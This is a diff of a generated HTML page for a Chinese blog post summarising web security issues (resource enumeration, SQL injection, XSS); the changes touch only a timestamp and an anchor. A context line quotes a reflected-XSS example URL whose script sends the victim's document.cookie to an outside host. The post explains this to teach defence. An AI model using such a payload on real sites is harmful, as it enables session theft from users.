@@ -97,7 +97,7 @@
 <meta property="og:url" content="http://iamzay.github.io/2017/09/21/Web安全问题总结/index.html">
 <meta property="og:site_name" content="我是郑安源">
 <meta property="og:description" content="资源枚举遍历站点可访问的文件夹，枚举可能存在的文件名，这样有可能下载到重要文件。措施:不要将重要文件放到公众可访问到的地方 参数操纵SQL注入提交含有SQL操作语句的信息给后端，比如一本书的详情url是这样：1book.com/book?id=100 这意味着这本书在数据库中的id为100，后端可能直接将这个id取出来，使用下面的语句查询：1select * from booktable wher">
-<meta property="og:updated_time" content="2017-09-21T02:45:55.796Z">
+<meta property="og:updated_time" content="2017-09-21T14:50:02.618Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全问题总结">
 <meta name="twitter:description" content="资源枚举遍历站点可访问的文件夹，枚举可能存在的文件名，这样有可能下载到重要文件。措施:不要将重要文件放到公众可访问到的地方 参数操纵SQL注入提交含有SQL操作语句的信息给后端，比如一本书的详情url是这样：1book.com/book?id=100 这意味着这本书在数据库中的id为100，后端可能直接将这个id取出来，使用下面的语句查询：1select * from booktable wher">
@@ -391,6 +391,7 @@
 <li>对用户提供的所有输入进行编码</li>
 <li>使用语言自带的存储程序，而不是自己操纵数据库</li>
 </ul>
+<a id="more"></a>
 <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS的特点是想尽一切办法在目标网站上执行第三方脚本。</p>
 <h3 id="基于反射的XSS"><a href="#基于反射的XSS" class="headerlink" title="基于反射的XSS"></a>基于反射的XSS</h3><p>有时用户会在页面上输入一些信息，且JS可能会将输入的信息重新展示一遍，如果不对输入进行过滤，那么当恶意用户输入的内容是一段包含script标签的脚本时，浏览器就会执行这段脚本。比如，通过QQ群等群发下面的链接就能获取用户的cookie:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">book.com/search?name=&lt;script&gt;document.location=&apos;http://vajoy/get?cookie=&apos;+document.cookie&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p>这是基于反射的XSS，由服务器返回脚本，客户端执行。</p>
